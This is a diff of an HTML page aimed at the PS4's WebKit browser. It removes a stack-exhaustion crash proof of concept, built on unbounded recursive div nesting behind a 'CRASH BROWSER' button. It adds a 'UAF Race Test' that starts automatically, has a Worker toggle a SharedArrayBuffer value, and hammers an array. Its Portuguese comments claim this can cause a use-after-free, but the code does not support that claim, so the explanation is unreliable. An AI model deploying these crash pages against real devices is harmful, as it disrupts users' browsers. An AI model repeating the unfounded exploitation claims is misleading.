@@ -1,42 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 DoS PoC</title>
+    <title>PS4 12.00 UAF Race Test</title>
+    <style>body { background: #111; color: red; font-family: sans-serif; }</style>
 </head>
 <body>
-    <h1>PS4 Stack Exhaustion PoC</h1>
-    <button onclick="crashMe()" style="font-size:30px; padding:20px;">CRASH BROWSER</button>
-    <div id="status">Waiting...</div>
+    <h1>WebKit Race Condition Test</h1>
+    <p>Tentando causar Use-After-Free (UAF) via Workers...</p>
+    <div id="log">Iniciando...</div>
 
     <script>
-        function crashMe() {
-            document.getElementById('status').innerText = "Flooding Stack...";
-            
-            setTimeout(() => {
-                // Minimal reproduction case for Stack Overflow
-                let root = document.createElement('div');
-                document.body.appendChild(root);
+        const workerCode = `
+            onmessage = function(e) {
+                // O Worker tenta esvaziar o array repetidamente
+                // enquanto a thread principal tenta ler.
+                const sab = e.data;
+                const view = new Int32Array(sab);
                 
-                function dive() {
-                    // Create nested div
-                    let child = document.createElement('div');
-                    // Force a layout calc to ensure WebCore stack usage
-                    child.innerText = "."; 
-                    root.appendChild(child);
-                    root = child;
+                while(true) {
+                    // Tenta causar desincronia no tamanho do buffer
+                    if (view[0] === 0) view[0] = 1;
+                    else view[0] = 0;
+                }
+            };
+        `;
+
+        function log(msg) { document.getElementById('log').innerText += "\n" + msg; }
+
+        function startRace() {
+            try {
+                // 1. Cria memória compartilhada (SharedArrayBuffer)
+                // Isso é essencial para bugar a memória entre threads
+                const sab = new SharedArrayBuffer(1024);
+                const view = new Int32Array(sab);
+                
+                // 2. Cria o Worker (thread paralela)
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+                
+                worker.postMessage(sab);
+                
+                log("Worker iniciado. Disparando Race Condition...");
+
+                // 3. Loop da Thread Principal (Tenta ler o array conflituoso)
+                // Se houver falha de sincronização, o WebKit pode ler 
+                // memória inválida ou desalocada.
+                const targetArray = new Array(1000).fill(1.1);
+                
+                let iteration = 0;
+                const interval = setInterval(() => {
+                    iteration++;
                     
-                    // Recursive call without effective exit condition for PS4 stack size
-                    dive(); 
-                }
-                
-                try {
-                    dive();
-                } catch(e) {
-                    // If the browser was secure, it would land here.
-                    document.getElementById('status').innerText = "Failed: Browser caught the error.";
-                }
-            }, 100);
+                    // Acesso massivo a propriedades flutuantes
+                    // Tentamos confundir o Garbage Collector
+                    for (let i = 0; i < 10000; i++) {
+                        // A operação inócua que pode falhar se a memória subjacente mudar
+                        targetArray[i % 100] = view[0] + Math.random(); 
+                    }
+
+                    if(iteration % 100 === 0) {
+                        log("Iteração: " + iteration + " (Sistema estável...)");
+                    }
+                    
+                    // Se chegar em 5000 sem crash, provavelmente não é vulnerável dessa forma
+                    if(iteration > 5000) {
+                        clearInterval(interval);
+                        log("Teste finalizado sem Crash.");
+                        worker.terminate();
+                    }
+                }, 10);
+
+            } catch (e) {
+                log("Erro: " + e.message);
+            }
         }
+
+        setTimeout(startRace, 1000);
     </script>
 </body>
 </html>
